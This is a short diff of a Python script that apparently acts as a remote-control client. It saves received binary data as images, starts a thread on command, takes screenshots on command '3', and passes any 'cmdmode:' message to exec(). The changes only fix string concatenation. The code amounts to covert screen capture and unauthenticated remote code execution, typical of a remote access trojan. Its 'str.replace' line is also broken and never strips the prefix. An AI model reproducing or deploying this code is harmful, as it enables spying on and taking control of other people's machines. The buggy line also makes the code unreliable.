@@ -22,7 +22,7 @@ try:
         try:
             data = data.decode()
         except Exception as e:
-            with open("img"+fileerror+".png","wb") as file:
+            with open("img"+str(fileerror)+".png","wb") as file:
                 file.write(data)
             fileerror += 1
             continue
@@ -33,12 +33,12 @@ try:
         elif data == "2" and not th.is_alive():
             th.start()
         elif data == "3":
-            pyautogui.screenshot().save("Screenshot"+screeniecounter + ".png")
+            pyautogui.screenshot().save("Screenshot"+str(screeniecounter) + ".png")
             screeniecounter = screeniecounter + 1
         elif "cmdmode:" in data:
             str.replace('cmdmode:', '')
             exec(data)
-            
+
     print("Update Window")
 except OSError as e:
     pass
